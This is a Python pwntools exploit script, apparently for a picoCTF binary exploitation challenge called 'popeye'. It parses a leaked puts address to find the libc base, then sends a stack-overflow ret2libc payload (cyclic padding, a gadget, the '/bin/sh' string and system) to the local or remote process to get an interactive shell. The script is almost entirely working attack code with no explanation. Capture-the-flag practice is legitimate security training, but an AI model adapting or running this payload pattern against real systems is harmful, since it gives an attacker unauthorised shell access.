#!/usr/bin/env python3
import sys
from pwn import *
context.log_level="debug"
import time
import os
import warnings
warnings.filterwarnings("ignore", category=BytesWarning)
gdb_script='''
'''

path="./popeye"
if os.path.exists("./flag.txt")==False:
	with open("flag.txt","w") as flag:
		flag.write("flag{pwned_m0T******}")
elf = context.binary=ELF(path,checksec=True)
libc=elf.libc
print(libc)
rop=ROP(elf)
HOST="saturn.picoctf.net"
PORT= 50266
context.binary = elf
p=process(path)
argument=sys.argv[1]
if argument=="l":
    p=process(path)
if argument=="r":
	p=remote(HOST,PORT)


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.strip().ljust(4, b'\0'))
uu64    = lambda data               :u64(data.strip().ljust(8, b'\0'))
ia 		= lambda 					: p.interactive()
rl 		= lambda 					: p.recvline()
#=======================================================================================
# gdb.attach(p)
leak=int(ru("]").split()[-1].decode(),16)
print(f"\033[32m{hex(leak)}\033[32m")
libc.address=leak-libc.sym.puts
print(f"\033[32m{hex(libc.address)}\033[32m")
payload = flat(
    cyclic(40, n=8),
    0x000000000040097c,
    next(libc.search(b"/bin/sh\x00")),
    libc.sym.system
)
sl(payload)
ia()